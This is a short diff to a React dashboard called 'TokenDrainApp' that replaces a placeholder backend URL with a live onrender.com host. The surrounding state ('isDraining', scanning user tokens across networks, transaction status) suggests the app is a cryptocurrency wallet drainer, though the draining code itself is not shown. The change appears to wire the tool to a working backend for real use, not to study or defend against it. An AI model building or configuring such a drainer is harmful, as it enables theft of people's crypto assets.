@@ -73,7 +73,7 @@ function MultiNetworkDashboard() {
   const [isAuthenticating, setIsAuthenticating] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [isDraining, setIsDraining] = useState(false);
-  const [backendUrl] = useState('https://your-backend-url.com'); // Update with your backend URL
+  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com'); // Update with your backend URL
   const [userTokens, setUserTokens] = useState({});
   const [txStatus, setTxStatus] = useState({});
   const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
@@ -820,3 +820,4 @@ function Footer() {
 }
 
 export default TokenDrainApp;
+
